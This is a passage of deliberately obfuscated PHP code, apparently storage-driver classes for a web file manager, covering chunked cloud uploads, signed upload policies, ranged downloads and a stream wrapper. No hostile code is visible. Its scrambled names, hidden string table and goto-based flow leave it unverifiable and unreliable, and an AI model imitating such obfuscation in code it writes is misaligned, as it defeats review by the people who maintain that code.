­¶Ü„Ûè = '') { $aå‰Ô¤ÖÁ¾ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$e ­¶Ü„Ûè) { $d´ê”˜ÂÙ = $this->ussRequest($b‹¬»ŠåÍ, $aå‰Ô¤ÖÁ¾[212]); return $d´ê”˜ÂÙ[$aå‰Ô¤ÖÁ¾[1036]]; } $c˜œ‡·äõâ = $this->tempFile($this->pathThis($b‹¬»ŠåÍ)); file_put_contents($c˜œ‡·äõâ, $e ­¶Ü„Ûè); if ($this->upload($b‹¬»ŠåÍ, $c˜œ‡·äõâ)) { $this->tempFileRemve($c˜œ‡·äõâ); return !0; } return !1; } public function fileSubstr($CÙñäìíƒ¦, $cè‚Ç…ÒÓ, $e…Ä…ãô¦¢) { $Aï©¯­‘î¬ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!($Dîø›‚Ÿµ = $this->link($CÙñäìíƒ¦))) { return !1; } $a©ÓÉÏ‡„¢ = !1; if ($e…Ä…ãô¦¢ > 0) { $eãêø’ˆµÓ = $cè‚Ç…ÒÓ + $e…Ä…ãô¦¢ - 1; $a©ÓÉÏ‡„¢ = array($Aï©¯­‘î¬[1226] . $cè‚Ç…ÒÓ . $Aï©¯­‘î¬[412] . $eãêø’ˆµÓ); } $E·Î°©Š¤º = url_request($Dîø›‚Ÿµ, $Aï©¯­‘î¬[216], !1, $a©ÓÉÏ‡„¢); return $E·Î°©Š¤º[$Aï©¯­‘î¬[692]] ? $E·Î°©Š¤º[$Aï©¯­‘î¬[1038]] : !1; } public function upload($c»Î©Éâš, $FÍ–‹êÂÖ, $bÃÇ£ç±Ø’ = false, $eˆÛ…Ã„ù— = REPEAT_REPLACE) { goto A°™…ŒùÄ; A°™…ŒùÄ: $C¸¨ïœø¯‘ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FùÁ§ƒáßÇ = IO::size($FÍ–‹êÂÖ); if ($FùÁ§ƒáßÇ <= 1024 * 1024 * 200) { $BÄ·©Ûåš = array($C¸¨ïœø¯‘[1266] . $FÍ–‹êÂÖ); $fâ­ŞœĞ‡Ÿ = $this->ussRequest($c»Î©Éâš, $C¸¨ïœø¯‘[214], $BÄ·©Ûåš); return $fâ­ŞœĞ‡Ÿ[$C¸¨ïœø¯‘[1036]] ? $this->getPathOuter($c»Î©Éâš) : !1; } goto dŒâÛÒÕ«; bêÛÛˆÈà¥: do { $c“‡°«Ş¬Ú = $c°•Öœ­ÎÃ[$C¸¨ïœø¯‘[1272]]; fseek($FÊˆ‘ß«Ö, $Aé°‡Çóµƒ); $BàùÊÉĞ™ù = fread($FÊˆ‘ß«Ö, $c“‡°«Ş¬Ú); $D¼ÑÚ¹²Ò = 0; do { $D¼ÑÚ¹²Ò++; $c°•Öœ­ÎÃ = $this->uploadPart($c»Î©Éâš, $c°•Öœ­ÎÃ, $BàùÊÉĞ™ù); } while (!$c°•Öœ­ÎÃ && $D¼ÑÚ¹²Ò < 3); if (!$c°•Öœ­ÎÃ) { return !1; } $DŒŒÆï÷Š° = $c°•Öœ­ÎÃ[$C¸¨ïœø¯‘[1271]]; $Aé°‡Çóµƒ += $c“‡°«Ş¬Ú; } while ($DŒŒÆï÷Š° != -1); fclose($FÊˆ‘ß«Ö); $bÉñ¨ã”µ° = array($C¸¨ïœø¯‘[1273], $C¸¨ïœø¯‘[1274] . $c°•Öœ­ÎÃ[$C¸¨ïœø¯‘[1275]], $C¸¨ïœø¯‘[1269]); goto fœ¦×ÍòØ; fœ¦×ÍòØ: $fâ­ŞœĞ‡Ÿ = $this->ussRequest($c»Î©Éâš, $C¸¨ïœø¯‘[214], !1, $bÉñ¨ã”µ°); return $fâ­ŞœĞ‡Ÿ[$C¸¨ïœø¯‘[1036]] ? $this->getPathOuter($E¸ø®ñ«Ç‘) : !1; goto céÉ©ùÜôÀ; bÔ‡Óİ˜‘ì: $DŒŒÆï÷Š° = $c°•Öœ­ÎÃ[$C¸¨ïœø¯‘[1271]]; $FÊˆ‘ß«Ö = fopen($FÍ–‹êÂÖ, $C¸¨ïœø¯‘[1176]); if (!$FÊˆ‘ß«Ö) { return !1; } goto bêÛÛˆÈà¥; dŒâÛÒÕ«: $C¥­Óê¤İ = 1024 * 1024 * 10; $bÉñ¨ã”µ° = array($C¸¨ïœø¯‘[1267], $C¸¨ïœø¯‘[1268] . $FùÁ§ƒáßÇ, $C¸¨ïœø¯‘[1269], $C¸¨ïœø¯‘[1270] . $C¥­Óê¤İ); $fâ­ŞœĞ‡Ÿ = $this->ussRequest($c»Î©Éâš, $C¸¨ïœø¯‘[214], !1, $bÉñ¨ã”µ°); goto C¹ŒêÜ¬ï‰; C¹ŒêÜ¬ï‰: if (!$fâ­ŞœĞ‡Ÿ[$C¸¨ïœø¯‘[1036]]) { return !1; } $c°•Öœ­ÎÃ = $fâ­ŞœĞ‡Ÿ[$C¸¨ïœø¯‘[1038]]; $Aé°‡Çóµƒ = 0; goto bÔ‡Óİ˜‘ì; céÉ©ùÜôÀ: } private function uploadPart($AãòøˆŒä, $bŠÍ—„Æ½Â, &$fé”ßÔÏ‘«) { $A¹¨¶ğÃ‹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f¼˜›¼»‚ = array($A¹¨¶ğÃ‹[1276], $A¹¨¶ğÃ‹[1274] . $bŠÍ—„Æ½Â[$A¹¨¶ğÃ‹[1275]], $A¹¨¶ğÃ‹[1277] . $bŠÍ—„Æ½Â[$A¹¨¶ğÃ‹[1271]], $A¹¨¶ğÃ‹[138] . $bŠÍ—„Æ½Â[$A¹¨¶ğÃ‹[1272]]); $f™ùª£Ó£ = $this->ussRequest($AãòøˆŒä, $A¹¨¶ğÃ‹[214], $fé”ßÔÏ‘«, $f¼˜›¼»‚); return !$f™ùª£Ó£[$A¹¨¶ğÃ‹[1036]] ? $f™ùª£Ó£[$A¹¨¶ğÃ‹[1036]] : $f™ùª£Ó£[$A¹¨¶ğÃ‹[1038]]; } public function uploadFormData($aåµò„£»Œ, $FÑ†Û÷ìåæ = 3600) { return $this->uploadPolicy($aåµò„£»Œ, $FÑ†Û÷ìåæ); } public function multiUploadFormData($bó“•ÖÀîİ, $DºùøšŠ¥Í = 3600) { $cæ÷‡Ëœ‚Ç =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aˆÈÁİ«¿­ = (int) $GLOBALS[$cæ÷‡Ëœ‚Ç[7]][$cæ÷‡Ëœ‚Ç[77]]; return $this->uploadPolicy($bó“•ÖÀîİ, $DºùøšŠ¥Í, $aˆÈÁİ«¿­); } private function uploadPolicy($fÓ’¥ÒŒğ», $e¢ïİ†„—† = 3600, $FÀÛ¥Ÿó¶ğ = 0) { goto d•÷‚“¥³¾; d•÷‚“¥³¾: $F›¨¥Ğ§ºâ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $ağÅˆ¡ù´Œ = $F›¨¥Ğ§ºâ[8] . $this->bucket; $CôÓÍ³‚Ş = gmdate($F›¨¥Ğ§ºâ[1211]); goto c‘ÍÛµ©¡„; c‘ÍÛµ©¡„: $B”å¤á‹…² = array($F›¨¥Ğ§ºâ[1278] => $this->bucket, $F›¨¥Ğ§ºâ[1279] => $fÓ’¥ÒŒğ», $F›¨¥Ğ§ºâ[1280] => time() + $e¢ïİ†„—†, $F›¨¥Ğ§ºâ[1281] => $CôÓÍ³‚Ş); if ($FÀÛ¥Ÿó¶ğ) { $B”å¤á‹…²[$F›¨¥Ğ§ºâ[1197]] = $FÀÛ¥Ÿó¶ğ; } $eâ”…Ë´‚å = base64_encode(json_encode($B”å¤á‹…²)); goto BÕäàœÔĞ¾; BÕäàœÔĞ¾: $f»§¦»İùÃ = base64_encode(hash_hmac($F›¨¥Ğ§ºâ[1248], "\120\x4f\123\124\46{$ağÅˆ¡ù´Œ}\46{$CôÓÍ³‚Ş}\x26{$eâ”…Ë´‚å}", md5("{$this->userpass}"), !0)); $BÏùÒğøƒ» = array($F›¨¥Ğ§ºâ[1116] => $eâ”…Ë´‚å, $F›¨¥Ğ§ºâ[1282] => "\125\x50\x59\125\x4e\40{$this->username}\72{$f»§¦»İùÃ}", $F›¨¥Ğ§ºâ[169] => $this->endpoint . $ağÅˆ¡ù´Œ); return $BÏùÒğøƒ»; goto bâÙÉß«ÈÓ; bâÙÉß«ÈÓ: } public function download($aÚÙŠÀºæ‚, $aŒÈ‰ÎÇÄæ) { goto DáŸŠ÷•˜; b‚¯ŞÂøòï: fclose($B©ùó›áˆ); return $aŒÈ‰ÎÇÄæ; goto dåË½ÀÖŸÇ; Cß™†ßä‘: $f¼¥ÇáôÍ = 1024 * 200; $B©ùó›áˆ = fopen($d‘ÃæÏİïî, $_SERVER[³‘’¼äÑ™ÔÍ][1232]); while (!0) { $DİÓÆÖÚ‰æ = $this->fileSubstr($aÚÙŠÀºæ‚, $BÄÔË«Õ, $f¼¥ÇáôÍ); if ($DİÓÆÖÚ‰æ === !1) { return !1; } fwrite($B©ùó›áˆ, $DİÓÆÖÚ‰æ); $BÄÔË«Õ += $f¼¥ÇáôÍ; if (strlen($DİÓÆÖÚ‰æ) < $f¼¥ÇáôÍ) { break; } } goto b‚¯ŞÂøòï; DáŸŠ÷•˜: $d‘ÃæÏİïî = IO::getPathInner(IO::mkfile($aŒÈ‰ÎÇÄæ)); if (!($dİ²œ½µ–É = $this->link($aÚÙŠÀºæ‚))) { return !1; } $BÄÔË«Õ = 0; goto Cß™†ßä‘; dåË½ÀÖŸÇ: } public function link($EóÙÏè«ÜÂ, $EÁÔîˆÍŞ = array()) { $f™…‚¸½â =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EóÙÏè«ÜÂ = trim($EóÙÏè«ÜÂ, $f™…‚¸½â[8]); if (!empty($this->token)) { $Eôî¡óÛ½… = strtotime(date($f™…‚¸½â[1283])); $EÊ…¸¶ øù = substr(md5($this->token . $f™…‚¸½â[272] . $Eôî¡óÛ½… . $f™…‚¸½â[1284] . $EóÙÏè«ÜÂ), 12, 8) . $Eôî¡óÛ½…; $EÁÔîˆÍŞ[] = $f™…‚¸½â[1285] . $EÊ…¸¶ øù; } $D¯ŒèÏî = !empty($EÁÔîˆÍŞ) ? $f™…‚¸½â[69] . implode($f™…‚¸½â[272], $EÁÔîˆÍŞ) : $f™…‚¸½â[33]; return $this->getHost() . $f™…‚¸½â[8] . $EóÙÏè«ÜÂ . $D¯ŒèÏî; } public function fileOut($d­®ÆµÂšÍ, $b…áÌ™‹‚ = false, $aÒ‚ğâ£¹Á = false, $A‚Í”¬½Ë¦ = '') { if (!$aÒ‚ğâ£¹Á) { $aÒ‚ğâ£¹Á = $this->pathThis($d­®ÆµÂšÍ); } $E¬ñªØ“Ï‰ = $b…áÌ™‹‚ ? array($_SERVER[³‘’¼äÑ™ÔÍ][1286] . rawurlencode($aÒ‚ğâ£¹Á)) : array(); $bæ¿ÀŠÔ—¯ = $this->link($d­®ÆµÂšÍ, $E¬ñªØ“Ï‰); $this->fileOutLink($bæ¿ÀŠÔ—¯); } public function fileOutServer($FÌ‘Àä˜´Š, $B‹¼¬ì™©˜ = false, $d§ĞÚÉÅİ = false, $F£é”ùÇÎë = '') { parent::fileOut($FÌ‘Àä˜´Š, $B‹¼¬ì™©˜, $d§ĞÚÉÅİ, $F£é”ùÇÎë); } public function fileOutImage($B²‚·†ù§¡, $Cæ¦¦ùé = 250) { $F…²ô†˜è» = $this->link($B²‚·†ù§¡ . $_SERVER[³‘’¼äÑ™ÔÍ][1287] . $Cæ¦¦ùé); $this->fileOutLink($F…²ô†˜è»); } public function fileOutImageServer($fÍ…Ÿ‘ÃŒÙ, $BÈê‚±Å¨ = 250) { parent::fileOutImage($fÍ…Ÿ‘ÃŒÙ, $BÈê‚±Å¨); } public function hashMd5($a’‡Õ½”ß×) { $d¸Ô½Á¨êò =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f†Š‹íëµñ = $this->objectMeta($a’‡Õ½”ß×); return isset($f†Š‹íëµñ[$d¸Ô½Á¨êò[196]]) ? $f†Š‹íëµñ[$d¸Ô½Á¨êò[196]] : !1; } public function size($F•Á‹¥œÄÔ) { $bœÍ©£¡½µ = $this->objectMeta($F•Á‹¥œÄÔ); return $bœÍ©£¡½µ ? $bœÍ©£¡½µ[$_SERVER[³‘’¼äÑ™ÔÍ][77]] : 0; } public function info($AÏ®Å°¸÷á) { if ($this->isFolder($AÏ®Å°¸÷á)) { return $this->folderInfo($AÏ®Å°¸÷á); } else { if ($this->isFile($AÏ®Å°¸÷á)) { return $this->fileInfo($AÏ®Å°¸÷á); } } return !1; } public function exist($F’Ô»óÔÌÃ) { return $this->isFile($F’Ô»óÔÌÃ) || $this->isFolder($F’Ô»óÔÌÃ); } public function isFile($CÜ˜‰»ˆƒ) { return !$this->isFolder($CÜ˜‰»ˆƒ) && $this->objectMeta($CÜ˜‰»ˆƒ); } public function isFolder($d™£ÍÀŠ¾½) { return $this->cacheMethod($_SERVER[³‘’¼äÑ™ÔÍ][223], $d™£ÍÀŠ¾½); } protected function objectMeta($CÑ—™“×ŸÈ) { return $this->cacheMethod($_SERVER[³‘’¼äÑ™ÔÍ][224], $CÑ—™“×ŸÈ); } protected function _objectMeta($C…õÀ³©Ï) { goto C÷àì‡í; aÎˆÙ¹–¢: if (!$Cùœ¹–§„İ[$B‡“ËƒÀÚ¶[1036]]) { return null; } $d¯†¦õåó = isset($Cùœ¹–§„İ[$B‡“ËƒÀÚ¶[1038]]) ? $Cùœ¹–§„İ[$B‡“ËƒÀÚ¶[1038]] : array(); if (!isset($d¯†¦õåó[$B‡“ËƒÀÚ¶[1289]])) { return null; } goto D˜ƒ¿Æ™ë; C÷àì‡í: $B‡“ËƒÀÚ¶ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($C…õÀ³©Ï == $B‡“ËƒÀÚ¶[33] || $C…õÀ³©Ï == $B‡“ËƒÀÚ¶[8]) { return array(); } $Cùœ¹–§„İ = $this->ussRequest($C…õÀ³©Ï, $B‡“ËƒÀÚ¶[1288]); goto aÎˆÙ¹–¢; D˜ƒ¿Æ™ë: $B÷¬²ğËÑ = array($B‡“ËƒÀÚ¶[28] => get_path_this($C…õÀ³©Ï), $B‡“ËƒÀÚ¶[29] => isset($d¯†¦õåó[$B‡“ËƒÀÚ¶[1289]]) ? $d¯†¦õåó[$B‡“ËƒÀÚ¶[1289]] : null, $B‡“ËƒÀÚ¶[77] => isset($d¯†¦õåó[$B‡“ËƒÀÚ¶[1290]]) ? $d¯†¦õåó[$B‡“ËƒÀÚ¶[1290]] : null, $B‡“ËƒÀÚ¶[196] => isset($d¯†¦õåó[$B‡“ËƒÀÚ¶[1291]]) ? $d¯†¦õåó[$B‡“ËƒÀÚ¶[1291]] : null, $B‡“ËƒÀÚ¶[1259] => isset($d¯†¦õåó[$B‡“ËƒÀÚ¶[1292]]) ? $d¯†¦õåó[$B‡“ËƒÀÚ¶[1292]] : null); $B÷¬²ğËÑ[$B‡“ËƒÀÚ¶[1260]] = isset($d¯†¦õåó[$B‡“ËƒÀÚ¶[1293]]) ? strtotime($d¯†¦õåó[$B‡“ËƒÀÚ¶[1293]]) : $B÷¬²ğËÑ[$B‡“ËƒÀÚ¶[1259]]; return $B÷¬²ğËÑ; goto f¤á‡ì‡Éï; f¤á‡ì‡Éï: } protected function _isFolder($CÔó‹·¼Œ³) { $aí§ØŒ–›„ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($CÔó‹·¼Œ³ == $aí§ØŒ–›„[33] || $CÔó‹·¼Œ³ == $aí§ØŒ–›„[8]) { return !0; } $a°š‚³âò = $this->objectMeta($CÔó‹·¼Œ³); return isset($a°š‚³âò[$aí§ØŒ–›„[29]]) && $a°š‚³âò[$aí§ØŒ–›„[29]] == $aí§ØŒ–›„[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($aŞÁò‚‘™ = false) { } public function exist($D¼£­£º©) { $b²ÌÄŒĞ¡ = $this->info($D¼£­£º©); return $b²ÌÄŒĞ¡[$_SERVER[³‘’¼äÑ™ÔÍ][188]]; } public function isFile($aÕä”Î‡¥) { $Eç¿ÆôÓºÅ = $this->info($aÕä”Î‡¥); return $Eç¿ÆôÓºÅ[$_SERVER[³‘’¼äÑ™ÔÍ][188]]; } public function isFolder($CÚ—„ÇŞƒÄ) { return !1; } public function size($cÅßÉòÏŸ) { $déáå‡·Û² = $this->info($cÅßÉòÏŸ); return $déáå‡·Û²[$_SERVER[³‘’¼äÑ™ÔÍ][77]]; } public function info($D°·ö¥À¨³) { return $this->infoParse($D°·ö¥À¨³); } public function infoAuth($Fö‰Õá¹Ï) { return $this->infoParse($Fö‰Õá¹Ï); } public function infoWithChildren($B‹‚¿¬Ø±‡) { return $this->infoParse($B‹‚¿¬Ø±‡); } public function infoFull($F«Š®ÊÔÖï) { return $this->infoParse($F«Š®ÊÔÖï); } private function infoParse($d›»¥ï ğ£) { $FË°”§»¸ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Eîİ¢ãØƒˆ = $this->header($d›»¥ï ğ£); if (!$Eîİ¢ãØƒˆ || !$Eîİ¢ãØƒˆ[$FË°”§»¸[692]]) { return !1; } $bê¹çÒßÙÏ = _get($Eîİ¢ãØƒˆ, $FË°”§»¸[325], 0); $B¾ÌÈøïÅ• = array($FË°”§»¸[28] => $Eîİ¢ãØƒˆ[$FË°”§»¸[28]], $FË°”§»¸[75] => $d›»¥ï ğ£, $FË°”§»¸[29] => $FË°”§»¸[167], $FË°”§»¸[77] => intval($bê¹çÒßÙÏ), $FË°”§»¸[160] => get_path_ext($Eîİ¢ãØƒˆ[$FË°”§»¸[28]]), $FË°”§»¸[1168] => $bê¹çÒßÙÏ > 0 && $Eîİ¢ãØƒˆ[$FË°”§»¸[1294]], $FË°”§»¸[1169] => !1); return $B¾ÌÈøïÅ•; } private function header($bõ½Ó°—) { if (isset(self::$_cacheHeader[$bõ½Ó°—])) { return self::$_cacheHeader[$bõ½Ó°—]; } self::$_cacheHeader[$bõ½Ó°—] = url_header($bõ½Ó°—); return self::$_cacheHeader[$bõ½Ó°—]; } public function hashSimple($DÆŒÌˆ¸, $a†ã²¼Ùµ = false) { goto fÄ…„«¦; fÄ…„«¦: $FÄØİ®¹Å½ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b®ˆ¤«¹œ = $this->info($DÆŒÌˆ¸); if (!$b®ˆ¤«¹œ || !$b®ˆ¤«¹œ[$FÄØİ®¹Å½[188]]) { return !1; } goto CÒ™İ«àëˆ; B’„ÄÔ×: $B¢é‹£ï¢ .= $this->fileSubstr($DÆŒÌˆ¸, $BÔ¸¥ËØÒÒ - $Añ——Œ²Ù, $Añ——Œ²Ù); return md5($B¢é‹£ï¢) . $BÔ¸¥ËØÒÒ; goto aÒ³ä‚èµ; CÒ™İ«àëˆ: $BÔ¸¥ËØÒÒ = $b®ˆ¤«¹œ[$FÄØİ®¹Å½[77]]; $Añ——Œ²Ù = 200; $E¤ëœ÷Æ½ = 50; goto D”Ç¼†ÎÇ; D”Ç¼†ÎÇ: if ($BÔ¸¥ËØÒÒ <= $Añ——Œ²Ù * $E¤ëœ÷Æ½) { return md5($this->fileSubstr($DÆŒÌˆ¸, 0, $BÔ¸¥ËØÒÒ)) . $BÔ¸¥ËØÒÒ; } $cŠåÑ•Ô÷Õ = intval($BÔ¸¥ËØÒÒ / $E¤ëœ÷Æ½); $B¢é‹£ï¢ = $FÄØİ®¹Å½[33]; goto E·ÙèĞÀâ¾; E·ÙèĞÀâ¾: $D˜šèÇÃ´Ö = timeFloat(); $D¦çæÑË‡ = 15; for ($FæÙå¨¹ƒ´ = 0; $FæÙå¨¹ƒ´ < $E¤ëœ÷Æ½; $FæÙå¨¹ƒ´++) { if (timeFloat() - $D˜šèÇÃ´Ö > $D¦çæÑË‡) { return !1; } $b…•Œñå°Ä = $this->fileSubstr($DÆŒÌˆ¸, $cŠåÑ•Ô÷Õ * $FæÙå¨¹ƒ´, $Añ——Œ²Ù); if (!$b…•Œñå°Ä) { return !1; } $B¢é‹£ï¢ .= $b…•Œñå°Ä; } goto B’„ÄÔ×; aÒ³ä‚èµ: } public function getContent($E×‹Ò¡÷ä) { return $this->fileSubstr($E×‹Ò¡÷ä); } public function fileSubstr($F£Í—¯¿Š, $EßŞ–ÂËŸ = 0, $B¸‰Ğ«Â‘ = -1) { goto f¥’‰ë­âŞ; eÜÚ« ŠÒù: $b“³Ò¹Öğ = url_request($F£Í—¯¿Š, $eÓ‘àÊ—†Ú[216], !1, $Bšáâ”Ÿ¢™, !1, !1, 1); return $b“³Ò¹Öğ[$eÓ‘àÊ—†Ú[1038]] ? $b“³Ò¹Öğ[$eÓ‘àÊ—†Ú[1038]] : $eÓ‘àÊ—†Ú[33]; goto eø‰×ÏãŞ; c¶Àº‚îâ: if ($B¸‰Ğ«Â‘ === -1) { $B¸‰Ğ«Â‘ = $FÓ‹öøˆ™Ÿ[$eÓ‘àÊ—†Ú[77]]; } if ($B¸‰Ğ«Â‘ == 0) { return $eÓ‘àÊ—†Ú[33]; } $Bšáâ”Ÿ¢™ = array($eÓ‘àÊ—†Ú[1295] . $EßŞ–ÂËŸ . $eÓ‘àÊ—†Ú[719] . ($EßŞ–ÂËŸ + $B¸‰Ğ«Â‘ - 1)); goto eÜÚ« ŠÒù; f¥’‰ë­âŞ: $eÓ‘àÊ—†Ú =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FÓ‹öøˆ™Ÿ = $this->info($F£Í—¯¿Š); if (!$FÓ‹öøˆ™Ÿ || !$FÓ‹öøˆ™Ÿ[$eÓ‘àÊ—†Ú[188]] && $FÓ‹öøˆ™Ÿ[$eÓ‘àÊ—†Ú[77]] > 1024 * 1024 * 10) { return !1; } goto c¶Àº‚îâ; eø‰×ÏãŞ: } public function download($aïØˆçâÀ³, $dªà²ï©) { Downloader::start($aïØˆçâÀ³, $dªà²ï©); return $dªà²ï©; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($cë¥”–ˆêâ, $cè» ä’”– = '') { goto eäğŞÏ ˜è; dÌ½¥â‚: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$cë¥”–ˆêâ])) { self::$_chunkBuffer[$cë¥”–ˆêâ] = array(); } goto cëæŸ×æ¬¼; cëæŸ×æ¬¼: return $this->info ? !0 : !1; goto D‡¼Ğé°³ä; eäğŞÏ ˜è: $this->info = $this->info($cë¥”–ˆêâ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[³‘’¼äÑ™ÔÍ][75]]; goto dÌ½¥â‚; D‡¼Ğé°³ä: } function stream_read($e’¸ËÇµò) { $dØ¦°ƒí” = $this->fileSubstr($this->pose, $e’¸ËÇµò); $this->pose += strlen($dØ¦°ƒí”); return $dØ¦°ƒí”; } public function stream_tell() { return $this->pose; } public function stream_seek($E¤¬Ü–¹‰´, $DõØù¯®æµ) { $aìœîóóÇ³ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($DõØù¯®æµ == SEEK_SET) { $this->pose = $E¤¬Ü–¹‰´; } else { if ($DõØù¯®æµ == SEEK_CUR) { $this->pose += $E¤¬Ü–¹‰´; } else { if ($DõØù¯®æµ == SEEK_END) { $this->pose = $this->info[$aìœîóóÇ³[77]] + intval($E¤¬Ü–¹‰´); } } } if ($E¤¬Ü–¹‰´ < 0) { $this->pose = $this->info[$aìœîóóÇ³[77]] + $E¤¬Ü–¹‰´; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[³‘’¼äÑ™ÔÍ][77]]; } public function stream_close() { return !0; } public function url_stat($aØÛ³ÚÎ, $C…Ö¯Ö±ğ´) { $fÎ×ˆÕö =& $_SERVER[³‘’¼äÑ™ÔÍ]; $BŒàšƒø»á = $this->info($aØÛ³ÚÎ); return array($fÎ×ˆÕö[1296] => 0, $fÎ×ˆÕö[1297] => 0, $fÎ×ˆÕö[12] => 32768 + 511, $fÎ×ˆÕö[1298] => 0, $fÎ×ˆÕö[1299] => 0, $fÎ×ˆÕö[1300] => 0, $fÎ×ˆÕö[1301] => 0, $fÎ×ˆÕö[77] => $BŒàšƒø»á[$fÎ×ˆÕö[77]], $fÎ×ˆÕö[1302] => $BŒàšƒø»á[$fÎ×ˆÕö[1174]], $fÎ×ˆÕö[1260] => $BŒàšƒø»á[$fÎ×ˆÕö[107]], $fÎ×ˆÕö[1259] => $BŒàšƒø»á[$fÎ×ˆÕö[187]], $fÎ×ˆÕö[1303] => 0, $fÎ×ˆÕö[1304] => 0); } static $fileInfo = array(); public function info($b÷çîŠ¥´È) { $d«°ª…ğĞÄ = $_SERVER[³‘’¼äÑ™ÔÍ][1305]; if (isset(self::$fileInfo[$b÷çîŠ¥´È])) { return self::$fileInfo[$b÷çîŠ¥´È]; } if (substr($b÷çîŠ¥´È, 0, strlen($d«°ª…ğĞÄ)) != $d«°ª…ğĞÄ) { return !1; } self::$fileInfo[$b÷çîŠ¥´È] = IO::info(substr($b÷çîŠ¥´È, strlen($d«°ª…ğĞÄ))); return self::$fileInfo[$b÷çîŠ¥´È]; } public static function read($b¾ÅÌ¾·ÄÉ, $Bí§²ÁçÕ, $F”¶Ç¨êê‹) { goto D·Ø²Š‹Õ–; D‹·¹–³À: return $e³Ì³é¿ƒ©; goto DÏİ¥ğæ‚ß; Aœ‡ÉÛŠ©‡: $E¯±›‰›Â = 0; while ($E¯±›‰›Â < $F”¶Ç¨êê‹) { $Dƒ¼’é§ìÉ = min($Dƒªä²×‹„, $F”¶Ç¨êê‹ - $E¯±›‰›Â); $e³Ì³é¿ƒ© .= fread($b„éğÇÈØ‰, $Dƒ¼’é§ìÉ); $E¯±›‰›Â += $Dƒ¼’é§ìÉ; } fclose($b„éğÇÈØ‰); goto D‹·¹–³À; dôŠëŒ÷•±: $Dƒªä²×‹„ = 8192; fseek($b„éğÇÈØ‰, $Bí§²ÁçÕ, SEEK_SET); $e³Ì³é¿ƒ© = $eÁ¾–ÌÍÀÎ[33]; goto Aœ‡ÉÛŠ©‡; D·Ø²Š‹Õ–: $eÁ¾–ÌÍÀÎ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b„éğÇÈØ‰ = fopen($b¾ÅÌ¾·ÄÉ, $eÁ¾–ÌÍÀÎ[1176]); if (!$b„éğÇÈØ‰) { return $eÁ¾–ÌÍÀÎ[33]; } goto dôŠëŒ÷•±; DÏİ¥ğæ‚ß: } public function fileSubstr($eŸ…Íº…•, $eÎñ‡©‹œÎ) { goto C˜›ÅÀ˜¢; Câ“ÙÙ±‰¡: $eÂƒ¶äèØ– = $eÎñ‡©‹œÎ; if ($eŸ…Íº…• < 0) { $eŸ…Íº…• = $aÁ–Ä¼ù‚» + $eŸ…Íº…•; } if ($eÎñ‡©‹œÎ === !1) { $eÎñ‡©‹œÎ = $aÁ–Ä¼ù‚» - $eŸ…Íº…•; } goto aàÉ‰İÇ­ê; C˜›ÅÀ˜¢: $EÒ‘ÚÚ¥÷½ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aÁ–Ä¼ù‚» = $this->info[$EÒ‘ÚÚ¥÷½[77]]; $fº±¨˜ÎÖ = $eŸ…Íº…•; goto Câ“ÙÙ±‰¡; BëæŒ×ô: $eàö•ù¦¿™ = 64 * 1024; $aò‘á­ÕòË =& self::$_chunkBuffer[$this->path]; if (!$aò‘á­ÕòË) { $aò‘á­ÕòË = array(); } goto fÓ·•„¯õ; f‚‰„¤Éİê: foreach ($aò‘á­ÕòË as $b‡Ó¬Š®¤Ñ => $a “Œßñª) { $b‡Ó¬Š®¤Ñ = intval($b‡Ó¬Š®¤Ñ); $Aš…”à¤é× = $b‡Ó¬Š®¤Ñ + strlen($a “Œßñª); if ($eŸ…Íº…• >= $Aš…”à¤é×) { continue; } if ($eŸ…Íº…• >= $b‡Ó¬Š®¤Ñ && $eŸ…Íº…• + $eÎñ‡©‹œÎ <= $Aš…”à¤é×) { return substr($a “Œßñª, $eŸ…Íº…• - $b‡Ó¬Š®¤Ñ, $eÎñ‡©‹œÎ); } break; } if (count($aò‘á­ÕòË) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($EÒ‘ÚÚ¥÷½[1306], $EÒ‘ÚÚ¥÷½[1307] . count($aò‘á­ÕòË) . "\73\x73\x74\x61\162\x74\x3d{$eŸ…Íº…•}\x2c\154\x65\x6e\147\x74\x68\75{$eÎñ‡©‹œÎ}\73\x70\157\x73\145\x3a{$b‡Ó¬Š®¤Ñ}\176{$Aš…”à¤é×}"); throw new Exception($EÒ‘ÚÚ¥÷½[1308]); } $dµĞ²Ü¸½ = intval($eŸ…Íº…• / $eàö•ù¦¿™) * $eàö•ù¦¿™; goto E±ö©œÆè; fÓ·•„¯õ: $b‡Ó¬Š®¤Ñ = 0; $Aš…”à¤é× = 0; $a “Œßñª = $EÒ‘ÚÚ¥÷½[33]; goto f‚‰„¤Éİê; aàÉ‰İÇ­ê: if ($eŸ…Íº…• + $eÎñ‡©‹œÎ > $aÁ–Ä¼ù‚») { $eÎñ‡©‹œÎ = $aÁ–Ä¼ù‚» - $eŸ…Íº…•; } if ($eÎñ‡©‹œÎ <= 0) { return $EÒ‘ÚÚ¥÷½[33]; } if ($eŸ…Íº…• < 0 || $eŸ…Íº…• >= $aÁ–Ä¼ù‚» || $eÎñ‡©‹œÎ <= 0 || $eÎñ‡©‹œÎ > 1024 * 1024 * 5) { throw new 